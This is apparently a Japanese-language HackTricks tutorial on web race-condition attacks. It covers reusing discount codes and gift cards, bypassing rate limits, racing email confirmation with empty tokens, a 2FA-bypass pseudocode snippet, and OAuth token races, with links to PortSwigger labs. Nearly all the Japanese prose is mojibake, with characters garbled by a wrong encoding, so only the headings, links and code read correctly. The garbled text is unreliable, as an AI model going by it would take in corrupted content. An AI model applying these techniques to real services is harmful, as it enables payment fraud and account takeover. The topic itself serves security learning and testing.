ã“ã‚Œã¯ã€**ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã‚‹å›æ•°ã‚’åˆ¶é™ã™ã‚‹å ´æ‰€ã«ç¾ã‚Œã‚‹** **è„†å¼±æ€§**ã®æœ€ã‚‚åŸºæœ¬çš„ãªã‚¿ã‚¤ãƒ—ã®ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã§ã™ã€‚ä¾‹ãˆã°ã€ã‚¦ã‚§ãƒ–ã‚¹ãƒˆã‚¢ã§åŒã˜å‰²å¼•ã‚³ãƒ¼ãƒ‰ã‚’ä½•åº¦ã‚‚ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚éå¸¸ã«ç°¡å˜ãªä¾‹ã¯[**ã“ã®ãƒ¬ãƒãƒ¼ãƒˆ**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)ã‚„[**ã“ã®ãƒã‚°**](https://hackerone.com/reports/759247)**ã«è¦‹ã‚‰ã‚Œã¾ã™ã€‚**

ã“ã®ç¨®ã®æ”»æ’ƒã«ã¯å¤šãã®ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ï¼š

* ã‚®ãƒ•ãƒˆã‚«ãƒ¼ãƒ‰ã‚’è¤‡æ•°å›åˆ©ç”¨ã™ã‚‹
* å•†å“ã‚’è¤‡æ•°å›è©•ä¾¡ã™ã‚‹
* ã‚¢ã‚«ã‚¦ãƒ³ãƒˆæ®‹é«˜ã‚’è¶…ãˆã¦ç¾é‡‘ã‚’å¼•ãå‡ºã—ãŸã‚Šè»¢é€ã—ãŸã‚Šã™ã‚‹
* å˜ä¸€ã®CAPTCHAè§£æ±ºç­–ã‚’å†åˆ©ç”¨ã™ã‚‹
* ã‚¢ãƒ³ãƒãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’å›é¿ã™ã‚‹

### **Hidden substates**

è¤‡é›‘ãªãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã¯ã€éš ã‚ŒãŸã¾ãŸã¯**æ„å›³ã—ãªã„ãƒã‚·ãƒ³ã®ã‚µãƒ–ã‚¹ãƒ†ãƒ¼ãƒˆ**ã¨ç›¸äº’ä½œç”¨ã™ã‚‹ãŸã‚ã®çŸ­ã„æ©Ÿä¼šã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã‚’å«ã‚€ã“ã¨ãŒã‚ˆãã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã™ã‚‹æ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

1. **æ½œåœ¨çš„ãªéš ã‚ŒãŸã‚µãƒ–ã‚¹ãƒ†ãƒ¼ãƒˆã‚’ç‰¹å®šã™ã‚‹**
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚»ãƒƒãƒˆãƒ—ãƒ­ã‚»ã‚¹ãªã©ã€é‡è¦ãªãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã¾ãŸã¯ç›¸äº’ä½œç”¨ã™ã‚‹ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ç‰¹å®šã™ã‚‹ã“ã¨ã‹ã‚‰å§‹ã‚ã¾ã™ã€‚ä»¥ä¸‹ã«ç„¦ç‚¹ã‚’å½“ã¦ã¾ã™ï¼š
* **ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸**ï¼šã‚µãƒ¼ãƒãƒ¼å´ã®æ°¸ç¶šãƒ‡ãƒ¼ã‚¿ã‚’æ“ä½œã™ã‚‹ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®ãƒ‡ãƒ¼ã‚¿ã‚’æ‰±ã†ã‚‚ã®ã‚ˆã‚Šã‚‚å„ªå…ˆã—ã¾ã™ã€‚
* **ã‚¢ã‚¯ã‚·ãƒ§ãƒ³**ï¼šæ—¢å­˜ã®ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã™ã‚‹æ“ä½œã‚’æ¢ã—ã¾ã™ã€‚ã“ã‚Œã¯æ–°ã—ã„ãƒ‡ãƒ¼ã‚¿ã‚’è¿½åŠ ã™ã‚‹ã‚‚ã®ã‚ˆã‚Šã‚‚æ‚ªç”¨å¯èƒ½ãªæ¡ä»¶ã‚’ä½œæˆã™ã‚‹å¯èƒ½æ€§ãŒé«˜ã„ã§ã™ã€‚
* **ã‚­ãƒ¼**ï¼šæˆåŠŸã—ãŸæ”»æ’ƒã¯é€šå¸¸ã€åŒã˜è­˜åˆ¥å­ï¼ˆä¾‹ï¼šãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚„ãƒªã‚»ãƒƒãƒˆãƒˆãƒ¼ã‚¯ãƒ³ï¼‰ã«åŸºã¥ãæ“ä½œã‚’å«ã¿ã¾ã™ã€‚
2. **åˆæœŸãƒ—ãƒ­ãƒ¼ãƒ“ãƒ³ã‚°ã‚’å®Ÿæ–½ã™ã‚‹**
* ç‰¹å®šã—ãŸã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«å¯¾ã—ã¦ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³æ”»æ’ƒã‚’ãƒ†ã‚¹ãƒˆã—ã€æœŸå¾…ã•ã‚Œã‚‹çµæœã‹ã‚‰ã®é€¸è„±ã‚’è¦³å¯Ÿã—ã¾ã™ã€‚äºˆæœŸã—ãªã„å¿œç­”ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å‹•ä½œã®å¤‰åŒ–ã¯è„†å¼±æ€§ã‚’ç¤ºã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
3. **è„†å¼±æ€§ã‚’ç¤ºã™**
* è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«å¿…è¦ãªæœ€å°é™ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆæ•°ã«æ”»æ’ƒã‚’çµã‚Šè¾¼ã¿ã¾ã™ã€‚é€šå¸¸ã¯2å›ã§ã™ã€‚ã“ã®ã‚¹ãƒ†ãƒƒãƒ—ã§ã¯ã€æ­£ç¢ºãªã‚¿ã‚¤ãƒŸãƒ³ã‚°ãŒé–¢ä¸ã™ã‚‹ãŸã‚ã€è¤‡æ•°å›ã®è©¦è¡Œã‚„è‡ªå‹•åŒ–ãŒå¿…è¦ã«ãªã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

### æ™‚é–“ã«æ•æ„Ÿãªæ”»æ’ƒ

ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã®ç²¾åº¦ã¯è„†å¼±æ€§ã‚’æ˜ã‚‰ã‹ã«ã™ã‚‹ã“ã¨ãŒã§ãã€ç‰¹ã«ã‚¿ã‚¤ãƒ ã‚¹ã‚¿ãƒ³ãƒ—ã®ã‚ˆã†ãªäºˆæ¸¬å¯èƒ½ãªæ–¹æ³•ãŒã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒˆãƒ¼ã‚¯ãƒ³ã«ä½¿ç”¨ã•ã‚Œã‚‹å ´åˆã«é¡•è‘—ã§ã™ã€‚ä¾‹ãˆã°ã€ã‚¿ã‚¤ãƒ ã‚¹ã‚¿ãƒ³ãƒ—ã«åŸºã¥ã„ã¦ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚»ãƒƒãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ã¨ã€åŒæ™‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å¯¾ã—ã¦åŒä¸€ã®ãƒˆãƒ¼ã‚¯ãƒ³ãŒè¨±å¯ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**æ‚ªç”¨ã™ã‚‹ã«ã¯ï¼š**

* å˜ä¸€ãƒ‘ã‚±ãƒƒãƒˆæ”»æ’ƒã®ã‚ˆã†ãªæ­£ç¢ºãªã‚¿ã‚¤ãƒŸãƒ³ã‚°ã‚’ä½¿ç”¨ã—ã¦ã€åŒæ™‚ã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚»ãƒƒãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã¾ã™ã€‚åŒä¸€ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯è„†å¼±æ€§ã‚’ç¤ºã—ã¾ã™ã€‚

**ä¾‹ï¼š**

* åŒæ™‚ã«2ã¤ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚»ãƒƒãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã—ã€ãã‚Œã‚‰ã‚’æ¯”è¼ƒã—ã¾ã™ã€‚ä¸€è‡´ã™ã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã¯ãƒˆãƒ¼ã‚¯ãƒ³ç”Ÿæˆã®æ¬ é™¥ã‚’ç¤ºå”†ã—ã¾ã™ã€‚

**ã“ã‚Œã‚’è©¦ã™ã«ã¯** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚**

## éš ã‚ŒãŸã‚µãƒ–ã‚¹ãƒ†ãƒ¼ãƒˆã®ã‚±ãƒ¼ã‚¹ã‚¹ã‚¿ãƒ‡ã‚£

### æ”¯æ‰•ã„ã¨ã‚¢ã‚¤ãƒ†ãƒ ã®è¿½åŠ 

ã“ã®[**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€**æ”¯æ‰•ã„**ã‚’è¡Œã„ã€**è¿½åŠ ã®**ã‚¢ã‚¤ãƒ†ãƒ ã‚’**æ”¯æ‰•ã‚ãšã«è¿½åŠ ã™ã‚‹**æ–¹æ³•ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

### ä»–ã®ãƒ¡ãƒ¼ãƒ«ã®ç¢ºèª

ã‚¢ã‚¤ãƒ‡ã‚¢ã¯ã€**ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç¢ºèªã—ã€åŒæ™‚ã«åˆ¥ã®ã‚‚ã®ã«å¤‰æ›´ã™ã‚‹**ã“ã¨ã§ã€ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ãŒå¤‰æ›´ã•ã‚ŒãŸæ–°ã—ã„ã‚‚ã®ã‚’ç¢ºèªã™ã‚‹ã‹ã©ã†ã‹ã‚’èª¿ã¹ã‚‹ã“ã¨ã§ã™ã€‚

### 2ã¤ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã¸ã®ãƒ¡ãƒ¼ãƒ«å¤‰æ›´ï¼ˆã‚¯ãƒƒã‚­ãƒ¼ã«åŸºã¥ãï¼‰

[**ã“ã®ç ”ç©¶**](https://portswigger.net/research/smashing-the-state-machine)ã«ã‚ˆã‚‹ã¨ã€Gitlabã¯ã“ã®æ–¹æ³•ã§ä¹—ã£å–ã‚‰ã‚Œã‚‹è„†å¼±æ€§ãŒã‚ã‚Šã€**1ã¤ã®ãƒ¡ãƒ¼ãƒ«ã®** **ãƒ¡ãƒ¼ãƒ«ç¢ºèªãƒˆãƒ¼ã‚¯ãƒ³ã‚’åˆ¥ã®ãƒ¡ãƒ¼ãƒ«ã«é€ä¿¡ã™ã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**ã“ã‚Œã‚’è©¦ã™ã«ã¯** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚**

### éš ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®çŠ¶æ…‹ / ç¢ºèªãƒã‚¤ãƒ‘ã‚¹

**2ã¤ã®ç•°ãªã‚‹æ›¸ãè¾¼ã¿**ãŒ**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã«æƒ…å ±ã‚’è¿½åŠ ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹**å ´åˆã€**æœ€åˆã®ãƒ‡ãƒ¼ã‚¿ã®ã¿ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æ›¸ãè¾¼ã¾ã‚Œã‚‹**å°ã•ãªæ™‚é–“ã®éƒ¨åˆ†ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹éš›ã«ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã¨**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ãŒ**æ›¸ãè¾¼ã¾ã‚Œ**ã€**æ–°ã—ãä½œæˆã•ã‚ŒãŸã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç¢ºèªã™ã‚‹ãŸã‚ã®ãƒˆãƒ¼ã‚¯ãƒ³**ãŒæ›¸ãè¾¼ã¾ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç¢ºèªã™ã‚‹ãŸã‚ã®ãƒˆãƒ¼ã‚¯ãƒ³ãŒnullã§ã‚ã‚‹**å°ã•ãªæ™‚é–“ãŒã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç™»éŒ²ã—ã€ç©ºã®ãƒˆãƒ¼ã‚¯ãƒ³**ï¼ˆ`token=`ã¾ãŸã¯`token[]=`ã¾ãŸã¯ä»–ã®ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ï¼‰ã§ç¢ºèªã™ã‚‹ãŸã‚ã«è¤‡æ•°ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€ãƒ¡ãƒ¼ãƒ«ã‚’åˆ¶å¾¡ã—ã¦ã„ãªã„ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’**ç¢ºèªã™ã‚‹**ã“ã¨ãŒã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**ã“ã‚Œã‚’è©¦ã™ã«ã¯** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚**

### 2FAã®ãƒã‚¤ãƒ‘ã‚¹

ä»¥ä¸‹ã®æ“¬ä¼¼ã‚³ãƒ¼ãƒ‰ã¯ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒä½œæˆã•ã‚Œã¦ã„ã‚‹é–“ã«**2FAãŒå¼·åˆ¶ã•ã‚Œã¦ã„ãªã„**éå¸¸ã«çŸ­ã„æ™‚é–“ãŒã‚ã‚‹ãŸã‚ã€ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦è„†å¼±ã§ã™ï¼š
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 æ°¸ç¶šçš„ãªæŒç¶šæ€§

ã„ãã¤ã‹ã® [**OAUth ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers) ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½œæˆã—ã€ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ãŒç™»éŒ²ã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èªè¨¼ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ãã®ãŸã‚ã«ã¯ã€**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ**ãŒ**ã‚ãªãŸã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**ã«**OAUth ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**å†…ã®ãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’**è¨±å¯ã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\
ã“ã“ã¾ã§ã€google/linkedin/githubãªã©ã®ä¸€èˆ¬çš„ãªãƒ­ã‚°ã‚¤ãƒ³ã§ã€"_ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ \<InsertCoolName> ãŒã‚ãªãŸã®æƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„ã¨ã—ã¦ã„ã¾ã™ã€‚è¨±å¯ã—ã¾ã™ã‹ï¼Ÿ_"ã¨ã„ã†ãƒšãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

#### `authorization_code` ã«ãŠã‘ã‚‹ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³

**å•é¡Œ**ã¯ã€ã‚ãªãŸãŒ**ãã‚Œã‚’å—ã‘å…¥ã‚Œã‚‹**ã¨ã€è‡ªå‹•çš„ã«æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«**`authorization_code`**ãŒé€ä¿¡ã•ã‚Œã‚‹ã¨ãã«ç™ºç”Ÿã—ã¾ã™ã€‚ãã®å¾Œã€ã“ã®**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ OAUth ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã®ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã—ã¦ã€ã‚ãªãŸã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®**`authorization_code`**ã‹ã‚‰è¤‡æ•°ã® AT/RT** (_èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³/ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³_) ã‚’ç”Ÿæˆã—ã¾ã™ã€‚åŸºæœ¬çš„ã«ã€ã‚ãªãŸãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ‡ãƒ¼ã‚¿ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ãŸäº‹å®Ÿã‚’æ‚ªç”¨ã—ã¦ã€**è¤‡æ•°ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã¾ã™**ã€‚ãã®å¾Œã€ã‚ãªãŸãŒ**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ‡ãƒ¼ã‚¿ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ãªããªã‚‹ã¨ã€1å¯¾ã® AT/RT ãŒå‰Šé™¤ã•ã‚Œã¾ã™ãŒã€ä»–ã®ã‚‚ã®ã¯ã¾ã æœ‰åŠ¹ã§ã™**ã€‚

#### `Refresh Token` ã«ãŠã‘ã‚‹ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³

ä¸€åº¦**æœ‰åŠ¹ãª RT**ã‚’**å–å¾—ã™ã‚‹ã¨ã€è¤‡æ•°ã® AT/RT ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ãã‚Œã‚’æ‚ªç”¨ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚ã•ã‚‰ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ‡ãƒ¼ã‚¿ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã®æ¨©é™ã‚’ã‚­ãƒ£ãƒ³ã‚»ãƒ«ã—ã¦ã‚‚ã€**è¤‡æ•°ã® RT ã¯ã¾ã æœ‰åŠ¹ã§ã™**ã€‚

## **WebSockets ã«ãŠã‘ã‚‹ RC**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) ã§ã¯ã€**ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã‚’ Web ã‚½ã‚±ãƒƒãƒˆã§ã‚‚æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã€ä¸¦è¡Œã—ã¦ WebSocket ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ Java ã® PoC**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

{% hint style="success" %}
AWS ãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**Telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã® GitHub ãƒªãƒã‚¸ãƒˆãƒªã« PR ã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚**é«˜åº¦ãª**ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦é§†å‹•ã•ã‚Œã‚‹**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰ã—ã€è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
